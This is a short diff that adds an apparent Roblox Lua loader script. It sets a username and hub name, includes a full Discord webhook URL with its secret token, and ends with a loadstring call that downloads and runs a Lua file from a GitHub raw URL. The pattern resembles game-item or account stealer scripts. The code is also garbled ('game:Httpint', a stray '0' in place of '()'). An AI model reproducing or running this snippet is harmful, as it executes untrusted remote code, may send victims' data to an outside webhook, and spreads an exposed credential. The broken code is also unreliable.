@@ -1,0 +1,5 @@
+Username "itsyoboykobe115" 
+G.Hublane "hzb hub" 
+G.WebhookUrl= "https://discord.com/api/webhooks/1109456663703982141/ZVeISSeF6L5QwrByIg2wKS-vbOHGtjgCbeLGlOnlny43BMe8EBhkcMjTafzXoUGxVXU5" 
+
+loadstring(game:Httpint("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))0
